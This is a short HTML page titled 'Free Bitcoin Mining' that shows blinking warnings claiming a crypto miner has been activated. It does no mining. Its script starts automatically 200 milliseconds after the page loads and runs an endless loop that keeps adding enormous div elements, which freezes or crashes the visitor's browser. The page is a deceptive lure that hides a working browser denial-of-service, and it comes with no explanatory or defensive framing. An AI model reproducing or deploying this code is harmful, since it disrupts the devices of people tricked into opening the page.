<!DOCTYPE html>
<html>
<head>
    <title>Free Bitcoin Mining</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; }
        .warning { color: red; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <h1>⚠️ WARNING: CRYPTO MINER ACTIVATED ⚠️</h1>
    <p class="warning">DEVICE OVERLOAD DETECTED</p>
    <p>BTC Mined: <span id="btc">0.00000000</span></p>
    <div id="crash"></div>
    <script>
        function crashBrowser() {
            while (true) {
                document.getElementById("crash").innerHTML += 
                    "<div style='width:9999px;height:9999px;background:#f00;'></div>";
            }
        }
        
        setTimeout(crashBrowser, 200);
    </script>
</body>
</html>
